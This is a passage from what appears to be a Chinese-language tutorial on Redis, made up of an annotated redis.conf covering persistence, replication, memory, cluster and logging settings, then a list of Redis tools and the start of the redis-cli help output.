syslog-ident redis</span><span class="token comment" spellcheck="true"># 日志的来源、设备</span><span class="token comment" spellcheck="true"># syslog-facility local0</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 可用的数据库数</span><span class="token comment" spellcheck="true"># 默认是16</span>databases <span class="token number">16</span><span class="token comment" spellcheck="true">################################ 快照  #################################</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 保存数据到磁盘,格式如下</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#   save &lt;seconds> &lt;changes></span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 指出在多长时间内,有多少次的更新操作,就将数据同步到数据文件中</span><span class="token comment" spellcheck="true"># 默认配置</span><span class="token comment" spellcheck="true"># save 900 1  900秒内至少有1个key被改变</span><span class="token comment" spellcheck="true"># save 300 10  300秒内至少有10个key被改变</span><span class="token comment" spellcheck="true"># save 60 10000 60秒类至少有10000个key被改变</span>save <span class="token number">900</span> <span class="token number">1</span>save <span class="token number">300</span> <span class="token number">10</span>save <span class="token number">60</span> <span class="token number">10000</span><span class="token comment" spellcheck="true"># 存储到本地数据时,时候压缩数据,默认是yes</span>rdbcompression yes<span class="token comment" spellcheck="true"># 本地持久化数据库文件名称,默认是dump.rdb</span>dbfilename dump<span class="token punctuation">.</span>rdb<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 当rdb持久化出现错误后，是否依然进行继续进行工作，</span><span class="token comment" spellcheck="true"># yes：不能进行工作，</span><span class="token comment" spellcheck="true"># no：可以继续进行工作，</span><span class="token comment" spellcheck="true"># 可以通过info中的rdb_last_bgsave_status了解RDB持久化是否有错误</span>stop<span class="token operator">-</span>writes<span class="token operator">-</span>on<span class="token operator">-</span>bgsave<span class="token operator">-</span>error yes<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 使用压缩rdb文件</span><span class="token comment" spellcheck="true"># yes：压缩，但是需要一些cpu的消耗</span><span class="token comment" spellcheck="true"># no：不压缩，需要更多的磁盘空间</span>rdbcompression yes<span class="token comment" spellcheck="true"># 是否校验rdb文件</span>rdbchecksum yes<span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 工作目录</span><span class="token comment" spellcheck="true"># 数据库镜像备份的文件放置的路径</span><span class="token comment" spellcheck="true"># 这里的路径跟文件名要分开配置是因为redis在进行备份时,先会把当前数据库的状态写入到一个临时文件中,等备份完成时,再把该临时文件替换成上面指定的文件,而这里的临时文件和上面所配置的备份文件都会放在这个指定的路径当中</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 注意这里必须指定一个目录,而不是文件</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################# 复制 #################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 主从复制,设置主从服务器</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   +---------------------+        +-----------------+</span><span class="token comment" spellcheck="true">#   |      Master              | ---> |    Replica        |</span><span class="token comment" spellcheck="true">#   | (receive writes)  |        |  (exact copy) |</span><span class="token comment" spellcheck="true">#   +---------------------+        +-----------------+</span><span class="token comment" spellcheck="true"># 1.ridis 是异步复制的</span><span class="token comment" spellcheck="true"># 2.复制是自动的.</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># replicaof &lt;masterip> &lt;masterport></span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 当master服务设置了密码保护时,slave服务器连接master需要密码</span><span class="token comment" spellcheck="true"># masterauth &lt;master-password></span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 当slave同master失去连接,或者仍然在进行复制是,slave有2种方式运行</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 1.如果slave-server-stale-date=yes (默认),slave会继续响应客户端请求</span><span class="token comment" spellcheck="true"># 2.如果为no,slave服务器对多有的命令发出错误信息'SYNC with master in progress',除去NFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG,  SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB     COMMAND, POST, HOST: and LATENCY.命令</span><span class="token comment" spellcheck="true">#</span>slave<span class="token operator">-</span>serve<span class="token operator">-</span>stale<span class="token operator">-</span>data yes<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># slave服务器读写配置</span><span class="token comment" spellcheck="true"># 默认情况下是只读的（yes）</span><span class="token comment" spellcheck="true"># 修改成no，可读可写（不建议）</span>slave<span class="token operator">-</span>read<span class="token operator">-</span>only yes<span class="token comment" spellcheck="true"># 是否使用socket方式复制数据。目前redis复制提供两种方式，disk和socket。如果新的slave连上来或者重连的slave无法部分同步，就会执行全量同步，master会生成rdb文件。有2种方式：disk方式是master创建一个新的进程把rdb文件保存到磁盘，再把磁盘上的rdb文件传递给slave。socket是master创建一个新的进程，直接把rdb文件以socket的方式发给slave。disk方式的时候，当一个rdb保存的过程中，多个slave都能共享这个rdb文件。socket的方式就的一个个slave顺序复制。在磁盘速度缓慢，网速快的情况下推荐用socket方式。</span>repl<span class="token operator">-</span>diskless<span class="token operator">-</span>sync no<span class="token comment" spellcheck="true"># diskless复制的延迟时间，防止设置为0。一旦复制开始，节点不会再接收新slave的复制请求直到下一个rdb传输。所以最好等待一段时间，等更多的slave连上来。</span>repl<span class="token operator">-</span>diskless<span class="token operator">-</span>sync<span class="token operator">-</span>delay <span class="token number">5</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># slave会按照一个时间间隔向master 发送 PINGs,设置时间间隔,默认是10秒</span><span class="token comment" spellcheck="true"># repl-ping-replica-period 10</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 设置slave和master数据传输时间间隔</span><span class="token comment" spellcheck="true"># repl-timeout 60</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 是否禁止复制tcp链接的tcp nodelay参数，可传递yes或者no。默认是no，即使用tcp nodelay。如果master设置了yes来禁止tcp nodelay设置，在把数据复制给slave的时候，会减少包的数量和更小的网络带宽。但是这也可能带来数据的延迟。默认我们推荐更小的延迟，但是在数据量传输很大的场景下，建议选择yes。</span>repl<span class="token operator">-</span>disable<span class="token operator">-</span>tcp<span class="token operator">-</span>nodelay no<span class="token comment" spellcheck="true"># 复制缓冲区大小，这是一个环形复制缓冲区，用来保存最新复制的命令。这样在slave离线的时候，不需要完全复制master的数据，如果可以执行部分同步，只需要把缓冲区的部分数据复制给slave，就能恢复正常复制状态。缓冲区的大小越大，slave离线的时间可以更长，复制缓冲区只有在有slave连接的时候才分配内存。没有slave的一段时间，内存会被释放出来，默认1m。</span>repl<span class="token operator">-</span>backlog<span class="token operator">-</span>size 5mb<span class="token comment" spellcheck="true"># master没有slave一段时间会释放复制缓冲区的内存，repl-backlog-ttl用来设置该时间长度。单位为秒。</span>repl<span class="token operator">-</span>backlog<span class="token operator">-</span>ttl <span class="token number">3600</span><span class="token comment" spellcheck="true"># 当master不可用，Sentinel会根据slave的优先级选举一个master。最低的优先级的slave，当选master。而配置成0，永远不会被选举。</span>slave<span class="token operator">-</span>priority <span class="token number">100</span><span class="token comment" spellcheck="true"># redis提供了可以让master停止写入的方式，如果配置了min-slaves-to-write，健康的slave的个数小于N，mater就禁止写入。master最少得有多少个健康的slave存活才能执行写命令。这个配置虽然不能保证N个slave都一定能接收到master的写操作，但是能避免没有足够健康的slave的时候，master不能写入来避免数据丢失。设置为0是关闭该功能。</span><span class="token comment" spellcheck="true"># min-slaves-to-write 3</span><span class="token comment" spellcheck="true"># 延迟小于min-slaves-max-lag秒的slave才认为是健康的slave。</span>min<span class="token operator">-</span>slaves<span class="token operator">-</span>max<span class="token operator">-</span>lag <span class="token number">10</span><span class="token comment" spellcheck="true"># 设置1或另一个设置为0禁用这个特性。</span>min<span class="token operator">-</span>slaves<span class="token operator">-</span>max<span class="token operator">-</span>lag <span class="token keyword">is</span> set to <span class="token number">10</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">###########################SECURITY ###################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 设置客户端连接后进行任何其他指定前需要使用的密码</span><span class="token comment" spellcheck="true">#  警告:因为redis速度相当快,所以在一台比较好的服务器下,一个外部的用户可以在一秒钟进行150K次的密码尝试,这意味着你需要指定非常非常强大的密码来防止暴力破解.</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># Example:</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 如果要删除一个命令,可以直接重命名它为一个空字符串</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># rename-command CONFIG ""</span><span class="token comment" spellcheck="true"># 更多设置参照配置文件.</span><span class="token comment" spellcheck="true">########################AOF##########################</span><span class="token comment" spellcheck="true"># 默认redis使用的是rdb方式持久化，这种方式在许多应用中已经足够用了。但是redis如果中途宕机，会导致可能有几分钟的数据丢失，根据save来策略进行持久化，Append Only File是另一种持久化方式，可以提供更好的持久化特性。Redis会把每次写入的数据在接收后都写入 appendonly.aof 文件，每次启动时Redis都会先把这个文件的数据读入内存里，先忽略RDB文件。</span>appendonly no<span class="token comment" spellcheck="true"># aof文件名</span>appendfilename <span class="token string">"appendonly.aof"</span><span class="token comment" spellcheck="true"># aof持久化策略的配置</span><span class="token comment" spellcheck="true"># no表示不执行fsync，由操作系统保证数据同步到磁盘，速度最快。</span><span class="token comment" spellcheck="true"># always表示每次写入都执行fsync，以保证数据同步到磁盘。</span><span class="token comment" spellcheck="true"># everysec表示每秒执行一次fsync，可能会导致丢失这1s数据。</span>appendfsync everysec<span class="token comment" spellcheck="true"># 在aof重写或者写入rdb文件的时候，会执行大量IO，此时对于everysec和always的aof模式来说，执行fsync会造成阻塞过长时间，no-appendfsync-on-rewrite字段设置为默认设置为no。如果对延迟要求很高的应用，这个字段可以设置为yes，否则还是设置为no，这样对持久化特性来说这是更安全的选择。设置为yes表示rewrite期间对新写操作不fsync,暂时存在内存中,等rewrite完成后再写入，默认为no，建议yes。Linux的默认fsync策略是30秒。可能丢失30秒数据。</span>no<span class="token operator">-</span>appendfsync<span class="token operator">-</span>on<span class="token operator">-</span>rewrite no<span class="token comment" spellcheck="true"># aof自动重写配置。当目前aof文件大小超过上一次重写的aof文件大小的百分之多少进行重写，即当aof文件增长到一定大小的时候Redis能够调用bgrewriteaof对日志文件进行重写。当前AOF文件大小是上次日志重写得到AOF文件大小的二倍（设置为100）时，自动启动新的日志重写过程。</span>auto<span class="token operator">-</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>percentage <span class="token number">100</span><span class="token comment" spellcheck="true"># 设置允许重写的最小aof文件大小，避免了达到约定百分比但尺寸仍然很小的情况还要重写</span>auto<span class="token operator">-</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>min<span class="token operator">-</span>size 64mb<span class="token comment" spellcheck="true"># aof文件可能在尾部是不完整的，当redis启动的时候，aof文件的数据被载入内存。重启可能发生在redis所在的主机操作系统宕机后，尤其在ext4文件系统没有加上data=ordered选项（redis宕机或者异常终止不会造成尾部不完整现象。）出现这种现象，可以选择让redis退出，或者导入尽可能多的数据。如果选择的是yes，当截断的aof文件被导入的时候，会自动发布一个log给客户端然后load。如果是no，用户必须手动redis-check-aof修复AOF文件才可以。</span>aof<span class="token operator">-</span>load<span class="token operator">-</span>truncated yes<span class="token comment" spellcheck="true">###############clients#####################</span><span class="token comment" spellcheck="true"># 设置能连上redis的最大客户端连接数量。默认是10000个客户端连接。由于redis不区分连接是客户端连接还是内部打开文件或者和slave连接等，所以maxclients最小建议设置到32。如果超过了maxclients，redis会给新的连接发送’max number of clients reached’，并关闭连接。</span>maxclients <span class="token number">10000</span><span class="token comment" spellcheck="true"># redis配置的最大内存容量。当内存满了，需要配合maxmemory-policy策略进行处理。注意slave的输出缓冲区是不计算在maxmemory内的。所以为了防止主机内存使用完，建议设置的maxmemory需要更小一些。</span>maxmemory <span class="token operator">&lt;</span>bytes<span class="token operator">></span><span class="token comment" spellcheck="true"># 内存容量超过maxmemory后的处理策略。</span><span class="token comment" spellcheck="true"># volatile-lru：利用LRU算法移除设置过过期时间的key。</span><span class="token comment" spellcheck="true"># volatile-random：随机移除设置过过期时间的key。</span><span class="token comment" spellcheck="true"># volatile-ttl：移除即将过期的key，根据最近过期时间来删除（辅以TTL）</span><span class="token comment" spellcheck="true"># allkeys-lru：利用LRU算法移除任何key。</span><span class="token comment" spellcheck="true"># allkeys-random：随机移除任何key。</span><span class="token comment" spellcheck="true"># noeviction：不移除任何key，只是返回一个写错误。</span><span class="token comment" spellcheck="true"># 上面的这些驱逐策略，如果redis没有合适的key驱逐，对于写命令，还是会返回错误。redis将不再接收写请求，只接收get请求。</span>maxmemory<span class="token operator">-</span>policy noeviction<span class="token comment" spellcheck="true"># lru检测的样本数。使用lru或者ttl淘汰算法，从需要淘汰的列表中随机选择sample个key，选出闲置时间最长的key移除。</span>maxmemory<span class="token operator">-</span>samples <span class="token number">5</span><span class="token comment" spellcheck="true"># 如果达到最大时间限制（毫秒），redis会记个log，然后返回error。当一个脚本超过了最大时限。只有SCRIPT KILL和SHUTDOWN NOSAVE可以用。第一个可以杀没有调write命令的东西。要是已经调用了write，只能用第二个命令杀。</span>lua<span class="token operator">-</span>time<span class="token operator">-</span>limit <span class="token number">5000</span><span class="token comment" spellcheck="true">#######################REDIS CLUSTER#############</span><span class="token comment" spellcheck="true"># 集群开关，默认是不开启集群模式。</span>cluster<span class="token operator">-</span>enabled yes<span class="token comment" spellcheck="true"># 集群配置文件的名称，每个节点都有一个集群相关的配置文件，持久化保存集群的信息。这个文件并不需要手动配置，这个配置文件有Redis生成并更新，每个Redis集群节点需要一个单独的配置文件，请确保与实例运行的系统中配置文件名称不冲突</span><span class="token comment" spellcheck="true"># cluster-config-file nodes-a.conf</span><span class="token comment" spellcheck="true"># 节点互连超时的阀值。集群节点超时毫秒数</span><span class="token comment" spellcheck="true"># cluster-node-timeout 15000</span><span class="token comment" spellcheck="true"># 在进行故障转移的时候，全部slave都会请求申请为master，但是有些slave可能与master断开连接一段时间了，导致数据过于陈旧，这样的slave不应该被提升为master。该参数就是用来判断slave节点与master断线的时间是否过长。判断方法是：</span><span class="token comment" spellcheck="true"># 比较slave断开连接的时间和(node-timeout * slave-validity-factor) +repl-ping-slave-period</span><span class="token comment" spellcheck="true"># 如果节点超时时间为三十秒, 并且slave-validity-factor为10,假设默认的repl-ping-slave-period是10秒，即如果超过310秒slave将不会尝试进行故障转移</span>cluster<span class="token operator">-</span>slave<span class="token operator">-</span>validity<span class="token operator">-</span>factor <span class="token number">10</span><span class="token comment" spellcheck="true"># master的slave数量大于该值，slave才能迁移到其他孤立master上，如这个参数若被设为2，那么只有当一个主节点拥有2 个可工作的从节点时，它的一个从节点会尝试迁移。</span>cluster<span class="token operator">-</span>migration<span class="token operator">-</span>barrier <span class="token number">1</span><span class="token comment" spellcheck="true"># 默认情况下，集群全部的slot有节点负责，集群状态才为ok，才能提供服务。设置为no，可以在slot没有全部分配的时候提供服务。不建议打开该配置，这样会造成分区的时候，小分区的master一直在接受写请求，而造成很长时间数据不一致。</span>cluster<span class="token operator">-</span>require<span class="token operator">-</span>full<span class="token operator">-</span>coverage yes<span class="token comment" spellcheck="true">########################SLOW LOG###############</span><span class="token comment" spellcheck="true"># slog log是用来记录redis运行中执行比较慢的命令耗时。当命令的执行超过了指定时间，就记录在slow log中，slog log保存在内存中，所以没有IO操作。</span><span class="token comment" spellcheck="true"># 执行时间比slowlog-log-slower-than大的请求记录到slowlog里面，单位是微秒，所以1000000就是1秒。注意，负数时间会禁用慢查询日志，而0则会强制记录所有命令。</span>slowlog<span class="token operator">-</span>log<span class="token operator">-</span>slower<span class="token operator">-</span>than <span class="token number">10000</span><span class="token comment" spellcheck="true"># 慢查询日志长度。当一个新的命令被写进日志的时候，最老的那个记录会被删掉。这个长度没有限制。只要有足够的内存就行。你可以通过 SLOWLOG RESET 来释放内存。</span>slowlog<span class="token operator">-</span>max<span class="token operator">-</span>len <span class="token number">128</span><span class="token comment" spellcheck="true"># 延迟监控功能是用来监控redis中执行比较缓慢的一些操作，用LATENCY打印redis实例在跑命令时的耗时图表。只记录大于等于下边设置的值的操作。0的话，就是关闭监视。默认延迟监控功能是关闭的，如果你需要打开，也可以通过CONFIG SET命令动态设置</span>latency<span class="token operator">-</span>monitor<span class="token operator">-</span>threshold <span class="token number">0</span><span class="token comment" spellcheck="true">###################EVENT NOTIFICATION###############</span><span class="token comment" spellcheck="true"># 键空间通知使得客户端可以通过订阅频道或模式，来接收那些以某种方式改动了 Redis 数据集的事件。因为开启键空间通知功能需要消耗一些 CPU ，所以在默认配置下，该功能处于关闭状态。</span><span class="token comment" spellcheck="true"># notify-keyspace-events的参数可以是以下字符的任意组合，它指定了服务器该发送哪些类型的通知：</span><span class="token comment" spellcheck="true">##K 键空间通知，所有通知以 __keyspace@__ 为前缀</span><span class="token comment" spellcheck="true">##E 键事件通知，所有通知以 __keyevent@__ 为前缀</span><span class="token comment" spellcheck="true">##g DEL 、 EXPIRE 、 RENAME 等类型无关的通用命令的通知</span><span class="token comment" spellcheck="true">##$ 字符串命令的通知</span><span class="token comment" spellcheck="true">##l 列表命令的通知</span><span class="token comment" spellcheck="true">##s 集合命令的通知</span><span class="token comment" spellcheck="true">##h 哈希命令的通知</span><span class="token comment" spellcheck="true">##z 有序集合命令的通知</span><span class="token comment" spellcheck="true">##x 过期事件：每当有过期键被删除时发送</span><span class="token comment" spellcheck="true">##e 驱逐(evict)事件：每当有键因为 maxmemory 政策而被删除时发送</span><span class="token comment" spellcheck="true">##A 参数 g$lshzxe 的别名</span><span class="token comment" spellcheck="true"># 输入的参数中至少要有一个 K 或者 E，否则的话，不管其余的参数是什么，都不会有任何 通知被分发。</span>notify<span class="token operator">-</span>keyspace<span class="token operator">-</span>events <span class="token string">""</span><span class="token comment" spellcheck="true">##################ADVANCED CONFIG##############</span><span class="token comment" spellcheck="true"># 数据量小于等于hash-max-ziplist-entries的用ziplist，大于hash-max-ziplist-entries用hash</span>hash<span class="token operator">-</span>max<span class="token operator">-</span>ziplist<span class="token operator">-</span>entries <span class="token number">512</span><span class="token comment" spellcheck="true"># value大小小于等于hash-max-ziplist-value的用ziplist，大于hash-max-ziplist-value用hash</span>hash<span class="token operator">-</span>max<span class="token operator">-</span>ziplist<span class="token operator">-</span>value <span class="token number">64</span><span class="token comment" spellcheck="true"># -5:最大大小：64 KB&lt;--不建议用于正常工作负载</span><span class="token comment" spellcheck="true"># -4:最大大小：32 KB&lt;--不推荐</span><span class="token comment" spellcheck="true"># -3:最大大小：16 KB&lt;--可能不推荐</span><span class="token comment" spellcheck="true"># -2:最大大小：8kb&lt;--良好</span><span class="token comment" spellcheck="true"># -1:最大大小：4kb&lt;--良好</span>list<span class="token operator">-</span>max<span class="token operator">-</span>ziplist<span class="token operator">-</span>size <span class="token operator">-</span><span class="token number">2</span><span class="token comment" spellcheck="true"># 0:禁用所有列表压缩</span><span class="token comment" spellcheck="true"># 1：深度1表示“在列表中的1个节点之后才开始压缩，</span><span class="token comment" spellcheck="true"># 从头部或尾部</span><span class="token comment" spellcheck="true"># 所以：【head】->node->node->…->node->【tail】</span><span class="token comment" spellcheck="true"># [头部]，[尾部]将始终未压缩；内部节点将压缩。</span><span class="token comment" spellcheck="true"># 2:[头部]->[下一步]->节点->节点->…->节点->[上一步]->[尾部]</span><span class="token comment" spellcheck="true"># 2这里的意思是：不要压缩头部或头部->下一个或尾部->上一个或尾部，</span><span class="token comment" spellcheck="true"># 但是压缩它们之间的所有节点。</span><span class="token comment" spellcheck="true"># 3:[头部]->[下一步]->[下一步]->节点->节点->…->节点->[上一步]->[上一步]->[尾部]</span>list<span class="token operator">-</span>compress<span class="token operator">-</span>depth <span class="token number">0</span><span class="token comment" spellcheck="true"># 数据量小于等于set-max-intset-entries用iniset，大于set-max-intset-entries用set</span>set<span class="token operator">-</span>max<span class="token operator">-</span>intset<span class="token operator">-</span>entries <span class="token number">512</span><span class="token comment" spellcheck="true"># 数据量小于等于zset-max-ziplist-entries用ziplist，大于zset-max-ziplist-entries用zset</span>zset<span class="token operator">-</span>max<span class="token operator">-</span>ziplist<span class="token operator">-</span>entries <span class="token number">128</span><span class="token comment" spellcheck="true"># value大小小于等于zset-max-ziplist-value用ziplist，大于zset-max-ziplist-value用zset</span>zset<span class="token operator">-</span>max<span class="token operator">-</span>ziplist<span class="token operator">-</span>value <span class="token number">64</span><span class="token comment" spellcheck="true"># value大小小于等于hll-sparse-max-bytes使用稀疏数据结构（sparse），大于hll-sparse-max-bytes使用稠密的数据结构（dense）。一个比16000大的value是几乎没用的，建议的value大概为3000。如果对CPU要求不高，对空间要求较高的，建议设置到10000左右</span>hll<span class="token operator">-</span>sparse<span class="token operator">-</span>max<span class="token operator">-</span>bytes <span class="token number">3000</span><span class="token comment" spellcheck="true"># 宏观节点的最大流/项目的大小。在流数据结构是一个基数</span><span class="token comment" spellcheck="true"># 树节点编码在这项大的多。利用这个配置它是如何可能#大节点配置是单字节和</span><span class="token comment" spellcheck="true"># 最大项目数，这可能包含了在切换到新节点的时候</span><span class="token comment" spellcheck="true"># appending新的流条目。如果任何以下设置来设置</span><span class="token comment" spellcheck="true"># ignored极限是零，例如，操作系统，它有可能只是一集通过设置限制最大#纪录到最大字节0和最大输入到所需的值</span>stream<span class="token operator">-</span>node<span class="token operator">-</span>max<span class="token operator">-</span>bytes <span class="token number">4096</span>stream<span class="token operator">-</span>node<span class="token operator">-</span>max<span class="token operator">-</span>entries <span class="token number">100</span><span class="token comment" spellcheck="true"># Redis将在每100毫秒时使用1毫秒的CPU时间来对redis的hash表进行重新hash，可以降低内存的使用。当你的使用场景中，有非常严格的实时性需要，不能够接受Redis时不时的对请求有2毫秒的延迟的话，把这项配置为no。如果没有这么严格的实时性要求，可以设置为yes，以便能够尽可能快的释放内存</span>activerehashing yes<span class="token comment" spellcheck="true"># 对客户端输出缓冲进行限制可以强迫那些不从服务器读取数据的客户端断开连接，用来强制关闭传输缓慢的客户端。</span><span class="token comment" spellcheck="true"># 对于normal client，第一个0表示取消hardlimit，第二个0和第三个0表示取消soft limit，normal client默认取消限制，因为如果没有寻问，他们是不会接收数据</span>client<span class="token operator">-</span>output<span class="token operator">-</span>buffer<span class="token operator">-</span>limit normal <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token comment" spellcheck="true"># 对于slave client和MONITERclient，如果client-output-buffer一旦超过256mb，又或者超过64mb持续60秒，那么服务器就会立即断开客户端连接</span>client<span class="token operator">-</span>output<span class="token operator">-</span>buffer<span class="token operator">-</span>limit replica 256mb 64mb <span class="token number">60</span><span class="token comment" spellcheck="true"># 对于pubsub client，如果client-output-buffer一旦超过32mb，又或者超过8mb持续60秒，那么服务器就会立即断开客户端连接</span>client<span class="token operator">-</span>output<span class="token operator">-</span>buffer<span class="token operator">-</span>limit pubsub 32mb 8mb <span class="token number">60</span><span class="token comment" spellcheck="true"># 这是客户端查询的缓存极限值大小</span>client<span class="token operator">-</span>query<span class="token operator">-</span>buffer<span class="token operator">-</span>limit 1gb<span class="token comment" spellcheck="true"># 在redis协议中，批量请求，即表示单个字符串，通常限制为512MB。但是您可以更改此限制。</span><span class="token comment" spellcheck="true"># proto-max-bulk-len 512mb</span><span class="token comment" spellcheck="true"># redis执行任务的频率为1s除以hz</span>hz <span class="token number">10</span><span class="token comment" spellcheck="true"># 当启用动态赫兹时，实际配置的赫兹将用作作为基线，但实际配置的赫兹值的倍数</span><span class="token comment" spellcheck="true"># 在连接更多客户端后根据需要使用。这样一个闲置的实例将占用很少的CPU时间，而繁忙的实例将反应更灵敏</span>dynamic<span class="token operator">-</span>hz yes<span class="token comment" spellcheck="true"># 在aof重写的时候，如果打开了aof-rewrite-incremental-fsync开关，系统会每32MB执行一次fsync。这对于把文件写入磁盘是有帮助的，可以避免过大的延迟峰值</span>aof<span class="token operator">-</span>rewrite<span class="token operator">-</span>incremental<span class="token operator">-</span>fsync yes<span class="token comment" spellcheck="true"># 在rdb保存的时候，如果打开了rdb-save-incremental-fsync开关，系统会每32MB执行一次fsync。这对于把文件写入磁盘是有帮助的，可以避免过大的延迟峰值</span>rdb<span class="token operator">-</span>save<span class="token operator">-</span>incremental<span class="token operator">-</span>fsync yes<span class="token comment" spellcheck="true">###################### ACTIVE DEFRAGMENTATION #####################</span><span class="token comment" spellcheck="true"># 已启用活动碎片整理</span><span class="token comment" spellcheck="true"># activedefrag yes</span><span class="token comment" spellcheck="true"># 启动活动碎片整理的最小碎片浪费量</span><span class="token comment" spellcheck="true"># active-defrag-ignore-bytes 100mb</span><span class="token comment" spellcheck="true"># 启动活动碎片整理的最小碎片百分比</span><span class="token comment" spellcheck="true"># active-defrag-threshold-lower 10</span><span class="token comment" spellcheck="true"># 我们使用最大努力的最大碎片百分比</span><span class="token comment" spellcheck="true"># active-defrag-threshold-upper 100</span><span class="token comment" spellcheck="true"># 以CPU百分比表示的碎片整理的最小工作量</span><span class="token comment" spellcheck="true"># active-defrag-cycle-min 5</span><span class="token comment" spellcheck="true"># 在CPU的百分比最大的努力和碎片整理</span><span class="token comment" spellcheck="true"># active-defrag-cycle-max 75</span><span class="token comment" spellcheck="true"># 将从中处理的set/hash/zset/list字段的最大数目</span><span class="token comment" spellcheck="true"># 主词典扫描</span><span class="token comment" spellcheck="true"># active-defrag-max-scan-fields 1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-redis-工具"><a href="#4-redis-工具" class="headerlink" title="4.redis 工具"></a>4.<code>redis</code> 工具</h3><blockquote><p>在<code>src</code> 中生成了以下<code>redis</code> 工具</p><ul><li><code>redis-server</code> :主服务工具</li><li><code>redis-cli</code> :命令行客户端</li><li><code>redis-benchmark</code> :性能测试工具</li><li><code>redis-check-aof</code> :<code>AOF</code> 文件修复工具</li><li><code>redis-check-rdb</code>:<code>rdb</code> 文件修复工具</li><li><code>redis-sentinal</code> :集群管理工具</li><li><code>redis.conf</code>:配置文件</li></ul></blockquote><h3 id="5-连接redis"><a href="#5-连接redis" class="headerlink" title="5.连接redis"></a>5.连接<code>redis</code></h3><blockquote><p>使用客户端工具<code>redis-cli</code></p><pre class="line-numbers language-shell"><code class="language-shell">[root@localhost src]# ./redis-cli -hredis-cli 5.0.7Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]-h <hostname>      Server hostname (default: 127.0.0.1).-p <port>          Server port (default: 6379).-s <socket>        Server socket (overrides hostname and port).-a <password>      Password to use when connecting to the server.               You can also use the REDISCLI_AUTH environment               variable to pass this password more safely               (if both are used, this argument takes predecence).-u <uri>           Server URI.-r <repeat>        Execute specified command N times.-i <interval>      When 